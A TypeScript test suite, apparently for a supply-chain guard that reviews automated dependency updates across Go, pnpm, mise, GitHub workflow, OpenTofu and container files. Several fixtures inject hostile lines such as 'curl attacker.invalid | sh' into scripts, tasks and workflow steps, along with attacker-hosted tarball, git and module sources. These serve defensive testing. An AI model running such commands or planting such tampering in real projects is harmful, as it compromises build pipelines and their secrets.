import assert from 'node:assert/strict';
import { test } from 'node:test';

import { upgradeProblem } from '../app-update.ts';
import { ruleFor } from './dependency-files.ts';

type Outcome = 'rejected' | 'safe' | 'unsafe';

interface Case {
  readonly after: string;
  readonly before: string;
  readonly expected: Outcome;
  readonly name: string;
  readonly path: string;
}

function outcome(path: string, before: string, after: string): Outcome {
  const rule = ruleFor(path);
  assert.ok(rule, `${path} has a rule`);
  const review = rule(path, before, after);
  if (review.findings.length > 0) {
    return 'rejected';
  }
  return review.updates.some((update) => upgradeProblem(update) !== undefined) ? 'unsafe' : 'safe';
}

const goModule = `module github.com/misaon/nylzo

go 1.27

toolchain go1.27.3

require (
\tgolang.org/x/crypto v0.58.0
\tmodernc.org/sqlite v1.61.0
)

require (
\tgithub.com/google/uuid v1.6.0 // indirect
\tmodernc.org/libc v1.79.0 // indirect
)
`;

const goChecksums = `modernc.org/libc v1.79.0 h1:9Dvvv++bAMSkSuBzuOFAatbTV5OIoq6Y6FohmD3e7q8=
modernc.org/libc v1.79.0/go.mod h1:uT3kR61NsbeKJSLqq83GJwSnZMVLlSjyAz4DfTaBy1M=
`;

const packageManifest = `{
  "name": "nylzo-web",
  "private": true,
  "packageManager": "pnpm@12.15.0",
  "scripts": { "test": "vitest run" },
  "dependencies": { "@nylzo/core": "workspace:*", "svelte": "5.57.2" },
  "devDependencies": { "typescript": "6.0.3" }
}
`;

const lockfile = `---
lockfileVersion: '9.0'

settings:
  autoInstallPeers: true

importers:

  .:
    dependencies:
      '@nylzo/core':
        specifier: workspace:*
        version: link:../core
      svelte:
        specifier: 5.57.2
        version: 5.57.2

packages:

  svelte@5.57.2:
    resolution: {integrity: sha512-1YiPCAXT0Ct6g1vOMmSLa0Nsc3QRMvtDF32ihgglGVrugIuIK38RyDiFNXVDhtQ81TJjSO57NdMw6DyYLqSGDQ==}
    deprecated: See https://example.invalid/support for supported versions.

snapshots:

  svelte@5.57.2: {}
`;

const lockfileUpdate = lockfile
  .replaceAll('5.57.2', '5.57.3')
  .replace('1YiPCAXT0Ct6g1vOMmSLa0Nsc3QRMvtDF32ihgglGVrugIuIK38RyDiFNXVDhtQ81TJjSO57NdMw6DyYLqSGDQ==', 'cHJvb2Y=');

const miseTools = `min_version = "2026.10.9"

[tools]
node = "24.22.1"
actionlint = "1.7.12"

[tasks.lint]
run = ["go run golang.org/x/vuln/cmd/govulncheck@v1.9.0 ./...", "actionlint"]
`;

const miseLock = `lockfile_version = 3

[[tools.actionlint]]
version = "1.7.12"
backend = "aqua:rhysd/actionlint"
specifiers = ["1.7.12"]

[tools.actionlint."platforms.linux-x64"]
checksum = "sha256:${'a'.repeat(64)}"
url = "https://github.com/rhysd/actionlint/releases/download/v1.7.12/actionlint_1.7.12_linux_amd64.tar.gz"
url_api = "https://api.github.com/repos/rhysd/actionlint/releases/assets/384924896"
provenance = "github-attestations"

[[tools.node]]
version = "24.22.1"
backend = "core:node"
specifiers = ["24.22.1"]

[tools.node."platforms.linux-x64"]
checksum = "sha256:${'b'.repeat(64)}"
url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-linux-x64.tar.gz"
`;

const miseLockUpdate = miseLock
  .replaceAll('1.7.12', '1.7.13')
  .replace('a'.repeat(64), 'c'.repeat(64))
  .replace('384924896', '400000000');

const checkoutPin = `actions/checkout@${'1'.repeat(40)} # v7.0.1`;
const workflow = `name: ci

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: ${checkoutPin}
        with:
          persist-credentials: false
      - uses: jdx/mise-action@${'2'.repeat(40)} # v5.2.4
        with:
          # renovate: datasource=github-releases depName=jdx/mise
          version: 2026.10.19
      - run: go run golang.org/x/vuln/cmd/govulncheck@v1.9.0 ./...
      - uses: renovatebot/github-action@${'3'.repeat(40)} # v46.3.11
        with:
          renovate-image: ghcr.io/renovatebot/renovate:44.192.2@sha256:${'4'.repeat(64)}
`;

const checkoutUpdate = workflow.replace(checkoutPin, () => `actions/checkout@${'5'.repeat(40)} # v7.0.2`);

const assets = `{
  "jq-amd64": {"package": "jqlang/jq", "version": "jq-1.8.2", "sha256": "${'a'.repeat(64)}"},
  "mise-amd64": {"package": "jdx/mise", "version": "v2026.10.19", "sha256": "${'b'.repeat(64)}"}
}
`;

const assetsUpdate = assets.replace('v2026.10.19', 'v2026.10.21').replace('b'.repeat(64), 'c'.repeat(64));

const toolchain = `{
  "flatcar": "4757.2.2",
  "gh": { "version": "2.103.3", "amd64": "${'a'.repeat(64)}", "arm64": "${'b'.repeat(64)}" },
  "caddy": "2.11.7"
}
`;

const compose = `services:
  caddy:
    image: caddy:2.11.7@sha256:${'a'.repeat(64)}
    cap_drop: [ALL]
`;

const runtimeTest = `spawn("docker", ["run", "ubuntu:24.04@sha256:${'a'.repeat(64)}", "bash", "-s"]);\n`;
const goreleaser = `dockers_v2:\n  - base_image: gcr.io/distroless/static-debian13:nonroot@sha256:${'a'.repeat(64)}\n`;
const deployTask = 'set -euo pipefail\nexec mise exec opentofu@1.13.2 -- node tools/deploy/hetzner.mts "$@"\n';

const openTofuModule = `terraform {
  required_version = "= 1.13.2"
  required_providers {
    hcloud = {
      source  = "hetznercloud/hcloud"
      version = "= 1.70.2"
    }
  }
}
`;

const openTofuLock = `provider "registry.opentofu.org/hetznercloud/hcloud" {
  version     = "1.70.2"
  constraints = "1.70.2"
  hashes = [
    "h1:9YL6g+iEfg3OzX6qSZOYsictVO0fNP09D6jRwIZKwQ0=",
    "zh:${'a'.repeat(64)}",
  ]
}
`;

const openTofuLockUpdate = openTofuLock
  .replaceAll('1.70.2', '1.70.3')
  .replace('9YL6g', 'Gjo00')
  .replace(`"zh:${'a'.repeat(64)}",`, () => `"zh:${'b'.repeat(64)}",\n    "zh:${'c'.repeat(64)}",`);

const cases: readonly Case[] = [
  {
    after: goModule.replace('libc v1.79.0', 'libc v1.79.1'),
    before: goModule,
    expected: 'safe',
    name: 'go.mod patch update',
    path: 'go.mod',
  },
  {
    after: `${goModule.replace('libc v1.79.0', 'libc v1.79.1')}\nreplace modernc.org/libc => github.com/attacker/libc v1.79.1\n`,
    before: goModule,
    expected: 'rejected',
    name: 'go.mod replace directive next to a version update',
    path: 'go.mod',
  },
  {
    after: goModule.replace('modernc.org/libc v1.79.0', 'github.com/attacker/libc v1.79.1'),
    before: goModule,
    expected: 'rejected',
    name: 'go.mod swaps the module behind a version update',
    path: 'go.mod',
  },
  {
    after: goModule.replace(
      '\tmodernc.org/sqlite v1.61.0\n',
      '\tmodernc.org/sqlite v1.61.0\n\tgithub.com/attacker/tool v1.0.0\n',
    ),
    before: goModule,
    expected: 'rejected',
    name: 'go.mod adds a requirement',
    path: 'go.mod',
  },
  {
    after: goModule.replace('libc v1.79.0', 'libc v1.78.9'),
    before: goModule,
    expected: 'unsafe',
    name: 'go.mod downgrade',
    path: 'go.mod',
  },
  {
    after: goModule.replace('libc v1.79.0', 'libc v1.80.0-rc.1'),
    before: goModule,
    expected: 'unsafe',
    name: 'go.mod prerelease',
    path: 'go.mod',
  },
  {
    after: goModule.replace('crypto v0.58.0', 'crypto v0.59.0'),
    before: goModule,
    expected: 'unsafe',
    name: 'go.mod minor update below 1.0',
    path: 'go.mod',
  },
  {
    after: goChecksums.replaceAll('v1.79.0', 'v1.79.1'),
    before: goChecksums,
    expected: 'safe',
    name: 'go.sum checksum lines',
    path: 'go.sum',
  },
  {
    after: `${goChecksums}// curl attacker.invalid\n`,
    before: goChecksums,
    expected: 'rejected',
    name: 'go.sum line that is not a checksum',
    path: 'go.sum',
  },
  {
    after: packageManifest.replace('5.57.2', '5.57.3').replace('pnpm@12.15.0', 'pnpm@12.16.0'),
    before: packageManifest,
    expected: 'safe',
    name: 'package.json version and package manager update',
    path: 'web/app/package.json',
  },
  {
    after: packageManifest.replace('5.57.2', '5.57.3').replace('vitest run', 'curl attacker.invalid | sh'),
    before: packageManifest,
    expected: 'rejected',
    name: 'package.json script change next to a version update',
    path: 'web/package.json',
  },
  {
    after: packageManifest.replace('"svelte": "5.57.2"', '"svelte": "5.57.2", "attacker": "1.0.0"'),
    before: packageManifest,
    expected: 'rejected',
    name: 'package.json adds a dependency',
    path: 'automation/package.json',
  },
  {
    after: packageManifest.replace(', "svelte": "5.57.2"', ''),
    before: packageManifest,
    expected: 'rejected',
    name: 'package.json removes a dependency',
    path: 'web/package.json',
  },
  {
    after: packageManifest.replace(
      '"private": true,',
      '"private": true, "pnpm": { "overrides": { "svelte": "5.0.0" } },',
    ),
    before: packageManifest,
    expected: 'rejected',
    name: 'package.json adds overrides',
    path: 'web/package.json',
  },
  {
    after: packageManifest.replace('"svelte": "5.57.2"', '"svelte": "https://attacker.invalid/svelte.tgz"'),
    before: packageManifest,
    expected: 'unsafe',
    name: 'package.json swaps a version for a tarball',
    path: 'web/package.json',
  },
  {
    after: packageManifest.replace('"typescript": "6.0.3"', '"typescript": "7.0.0"'),
    before: packageManifest,
    expected: 'unsafe',
    name: 'package.json major update',
    path: 'web/package.json',
  },
  {
    after: lockfileUpdate,
    before: lockfile,
    expected: 'safe',
    name: 'pnpm lockfile update',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace(
      /resolution: \{integrity: [^}]+\}/,
      'resolution: {tarball: https://attacker.invalid/svelte.tgz}',
    ),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile tarball source',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace(
      /resolution: \{integrity: [^}]+\}/,
      'resolution: {type: git, repo: https://github.com/attacker/svelte.git, commit: 0123abc}',
    ),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile git source',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace(
      /resolution: \{integrity: [^}]+\}/,
      'resolution: {"tarball": "//attacker.invalid/svelte.tgz"}',
    ),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile protocol-relative tarball',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('version: link:../core', 'version: link:../core-evil'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile link beside the workspace package',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('version: link:../core', 'version: file:../../outside'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile file source',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate,
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile workspace link where none is allowed',
    path: 'automation/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('https://example.invalid/support', 'https://attacker.invalid/new-warning'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile new deprecation link',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('    deprecated:', '    key: &download tarball\n    deprecated:'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile YAML anchor',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace(
      '    deprecated:',
      '    source: "\\u0068ttps://attacker.invalid/svelte.tgz"\n    deprecated:',
    ),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile escaped source',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('autoInstallPeers: true', 'autoInstallPeers: false'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile settings change',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace(/resolution: \{integrity: [^}]+\}/, 'resolution: {}'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile without integrity',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: `${lockfileUpdate}\n  outside@1.0.0:\n    resolution: {directory: ../../outside, type: directory}\n`,
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile directory source',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: lockfileUpdate.replace('    deprecated:', '    tarball: //attacker.invalid/svelte.tgz\n    deprecated:'),
    before: lockfile,
    expected: 'rejected',
    name: 'pnpm lockfile tarball key',
    path: 'web/pnpm-lock.yaml',
  },
  {
    after: miseTools.replace('24.22.1', '24.22.2'),
    before: miseTools,
    expected: 'safe',
    name: 'mise tool update',
    path: 'mise.toml',
  },
  {
    after: `${miseTools.replace('24.22.1', '24.22.2')}\n[tasks.inject]\nrun = "curl attacker.invalid | sh"\n`,
    before: miseTools,
    expected: 'rejected',
    name: 'mise task next to a tool update',
    path: 'mise.toml',
  },
  {
    after: miseTools.replace('2026.10.9', '2026.10.8'),
    before: miseTools,
    expected: 'unsafe',
    name: 'mise minimum version downgrade',
    path: 'mise.toml',
  },
  { after: miseLockUpdate, before: miseLock, expected: 'safe', name: 'mise lock update', path: 'mise.lock' },
  {
    after: miseLockUpdate.replace('https://github.com/rhysd', 'https://attacker.invalid/rhysd'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock download host',
    path: 'mise.lock',
  },
  {
    after: miseLockUpdate.replace('github.com/rhysd/actionlint/releases', 'github.com/attacker/actionlint/releases'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock download from another repository',
    path: 'mise.lock',
  },
  {
    after: miseLockUpdate.replace('aqua:rhysd/actionlint', 'aqua:attacker/actionlint'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock backend',
    path: 'mise.lock',
  },
  {
    after: miseLockUpdate.replace('provenance = "github-attestations"', 'provenance = "none"'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock provenance',
    path: 'mise.lock',
  },
  {
    after: miseLockUpdate.replace('specifiers = ["1.7.13"]', 'specifiers = ["1.7.12"]'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock specifiers differ from the version',
    path: 'mise.lock',
  },
  {
    after: miseLockUpdate.replace(`sha256:${'c'.repeat(64)}`, 'sha256:not-a-digest'),
    before: miseLock,
    expected: 'rejected',
    name: 'mise lock malformed checksum',
    path: 'mise.lock',
  },
  {
    after: checkoutUpdate,
    before: workflow,
    expected: 'safe',
    name: 'workflow action pin update',
    path: '.github/workflows/ci.yml',
  },
  {
    after: workflow.replace('2026.10.19', '2026.10.21').replace('@v1.9.0', '@v1.9.1').replace('44.192.2', '44.198.3'),
    before: workflow,
    expected: 'safe',
    name: 'workflow annotated, govulncheck and Renovate image updates',
    path: '.github/workflows/ci.yml',
  },
  {
    after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
    before: workflow,
    expected: 'rejected',
    name: 'workflow run line next to a pin update',
    path: '.github/workflows/ci.yml',
  },
  {
    after: checkoutUpdate.replace('contents: read', 'contents: write'),
    before: workflow,
    expected: 'rejected',
    name: 'workflow permissions next to a pin update',
    path: '.github/workflows/ci.yml',
  },
  {
    after: checkoutUpdate.replace('actions/checkout@', 'attacker/checkout@'),
    before: workflow,
    expected: 'rejected',
    name: 'workflow action identity',
    path: '.github/workflows/ci.yml',
  },
  {
    after: checkoutUpdate.replace('persist-credentials: false', 'persist-credentials: true'),
    before: workflow,
    expected: 'rejected',
    name: 'workflow step input next to a pin update',
    path: '.github/workflows/ci.yml',
  },
  {
    after: `${checkoutUpdate}      - run: curl attacker.invalid | sh\n`,
    before: workflow,
    expected: 'rejected',
    name: 'workflow added step',
    path: '.github/workflows/ci.yml',
  },
  {
    after: checkoutUpdate.replace('# v7.0.2', '# v8.0.0'),
    before: workflow,
    expected: 'unsafe',
    name: 'workflow major action update',
    path: '.github/workflows/ci.yml',
  },
  {
    after: assetsUpdate,
    before: assets,
    expected: 'safe',
    name: 'binary asset update',
    path: 'tools/dependencies/assets.json',
  },
  {
    after: assetsUpdate.replace('jdx/mise', 'attacker/mise'),
    before: assets,
    expected: 'rejected',
    name: 'binary asset from another repository',
    path: 'tools/dependencies/assets.json',
  },
  {
    after: assetsUpdate.replace('c'.repeat(64), 'not-a-checksum'),
    before: assets,
    expected: 'rejected',
    name: 'binary asset malformed checksum',
    path: 'tools/dependencies/assets.json',
  },
  {
    after: assets.replace('jq-1.8.2', '1.8.3'),
    before: assets,
    expected: 'rejected',
    name: 'binary asset version format',
    path: 'tools/dependencies/assets.json',
  },
  {
    after: toolchain.replace('2.11.7', '2.11.8').replace('a'.repeat(64), 'c'.repeat(64)),
    before: toolchain,
    expected: 'safe',
    name: 'host toolchain update',
    path: 'deploy/hetzner-flatcar/toolchain.json',
  },
  {
    after: toolchain.replace('"caddy": "2.11.7"', '"caddy": "2.11.7", "extra": "1.0.0"'),
    before: toolchain,
    expected: 'rejected',
    name: 'host toolchain new field',
    path: 'deploy/hetzner-flatcar/toolchain.json',
  },
  {
    after: compose.replace('2.11.7', '2.11.8').replace('a'.repeat(64), 'b'.repeat(64)),
    before: compose,
    expected: 'safe',
    name: 'Caddy image update',
    path: 'deploy/compose/compose.yaml',
  },
  {
    after: compose.replace('cap_drop: [ALL]', 'privileged: true'),
    before: compose,
    expected: 'rejected',
    name: 'compose setting',
    path: 'deploy/compose/compose.yaml',
  },
  {
    after: runtimeTest.replace('a'.repeat(64), 'b'.repeat(64)),
    before: runtimeTest,
    expected: 'safe',
    name: 'test image digest refresh',
    path: 'tools/deploy/runtime.test.mts',
  },
  {
    after: runtimeTest.replace('24.04', '26.04').replace('a'.repeat(64), 'b'.repeat(64)),
    before: runtimeTest,
    expected: 'rejected',
    name: 'test image OS upgrade',
    path: 'tools/deploy/runtime.test.mts',
  },
  {
    after: goreleaser.replace('a'.repeat(64), 'b'.repeat(64)),
    before: goreleaser,
    expected: 'safe',
    name: 'distroless digest refresh',
    path: '.goreleaser.yaml',
  },
  {
    after: goreleaser.replace('static-debian13:nonroot', 'base-debian13:debug'),
    before: goreleaser,
    expected: 'rejected',
    name: 'distroless image swap',
    path: '.goreleaser.yaml',
  },
  { after: '24.22.2\n', before: '24.22.1\n', expected: 'safe', name: 'Node.js version', path: 'web/.node-version' },
  {
    after: '⟪version⟫\n',
    before: '24.22.1\n',
    expected: 'rejected',
    name: 'a literal placeholder in place of a version',
    path: 'web/.node-version',
  },
  {
    after: deployTask.replace('1.13.2', '1.13.3'),
    before: deployTask,
    expected: 'safe',
    name: 'OpenTofu in the deploy task',
    path: 'mise-tasks/deploy',
  },
  {
    after: deployTask.replace('1.13.2', '1.13.3').replace('hetzner.mts', 'hetzner.mts --auto-approve'),
    before: deployTask,
    expected: 'rejected',
    name: 'deploy task command',
    path: 'mise-tasks/deploy',
  },
  {
    after: openTofuModule.replace('1.70.2', '1.70.3'),
    before: openTofuModule,
    expected: 'safe',
    name: 'OpenTofu provider version',
    path: 'deploy/hetzner-flatcar/infrastructure/server/main.tf',
  },
  {
    after: openTofuModule.replace('hetznercloud/hcloud', 'attacker/hcloud'),
    before: openTofuModule,
    expected: 'rejected',
    name: 'OpenTofu provider source',
    path: 'deploy/hetzner-flatcar/infrastructure/server/main.tf',
  },
  {
    after: openTofuLockUpdate,
    before: openTofuLock,
    expected: 'safe',
    name: 'OpenTofu lock update',
    path: 'deploy/hetzner-flatcar/infrastructure/dns/.terraform.lock.hcl',
  },
  {
    after: openTofuLockUpdate.replace('hetznercloud/hcloud', 'attacker/hcloud'),
    before: openTofuLock,
    expected: 'rejected',
    name: 'OpenTofu lock provider',
    path: 'deploy/hetzner-flatcar/infrastructure/dns/.terraform.lock.hcl',
  },
];

for (const { after, before, expected, name, path } of cases) {
  void test(`${name} is ${expected}`, () => {
    assert.equal(outcome(path, before, after), expected);
  });
}

void test('files outside the dependency rules have no rule', () => {
  for (const path of ['internal/server/server.go', 'tools/security/bootstrap-policy', 'web/pnpm-workspace.yaml']) {
    assert.equal(ruleFor(path), undefined, path);
  }
});
